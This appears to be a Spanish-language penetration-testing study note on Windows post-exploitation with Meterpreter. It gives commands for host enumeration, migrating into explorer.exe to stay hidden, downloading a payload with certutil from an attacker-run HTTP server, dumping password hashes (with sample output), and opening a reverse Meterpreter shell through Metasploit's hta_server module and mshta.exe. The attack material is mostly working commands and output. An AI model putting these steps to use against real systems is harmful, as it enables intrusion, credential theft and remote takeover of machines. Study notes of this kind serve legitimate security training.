# Pasos una vez comprometido

## Meterpreter

Una vez tenemos una shell de [[metasploit|meterpreter]], ejecutaremos lo siguiente:

```powershell
sysinfo

getprivs

shell

net user

net localgroup administrators
```

También debemos migrar la sesión a un pid más discreto:

```powershell
meterpreter > ps -S explorer.exe
Filtering on 'explorer.exe'

Process List
============

 PID   PPID  Name          Arch  Session  User          Path
 ---   ----  ----          ----  -------  ----          ----
 2372  2364  explorer.exe  x64   1        VICTIM\admin  C:\Windows\explorer.exe

meterpreter > migrate 2372
```

## Búsqueda de contraseñas

Lo primero que podemos hacer es buscar [[Windows Passwords Hashes|contraseñas o hashes]].

## Token impersonation

Mediante ciertos privilegios tal vez podemos [[Access Token Impersonation|impersonarnos un token]] de administrador.

## Subir un archivo 

Nos montamos un servidor http con [[python]].

```powershell
certutil -urlcache -f http://10.10.5.2/payload.exe payload.exe
```

# Post-Explotación

Una vez escalamos:

```powershell
meterpreter > hashdump
admin:1012:aad3b435b51404eeaad3b435b51404ee:4d6583ed4cef81c2f2ac3c88fc5f3da6:::
Administrator:500:aad3b435b51404eeaad3b435b51404ee:659c8124523a634e0ba68e64bb1d822f:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
```

## Meterpreter

### HTA Server

Si hemos escalado privilegios podemos conseguir una sesión de meterpreter con el módulo `hta_server`:

```bash
msf6 > use exploit/windows/misc/hta_server 
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf6 exploit(windows/misc/hta_server) > run
```

Si abrimos la url que nos da en windows, se ejecutará un payload:

```powershell
mshta.exe http://10.10.41.5:8080/1BG7wz1uVd.hta
```
```bash
[*] Sending stage (176198 bytes) to 10.2.16.148
[*] Meterpreter session 1 opened (10.10.41.5:4444 -> 10.2.16.148:49769) at 2025-02-12 16:15:31 +0530
```
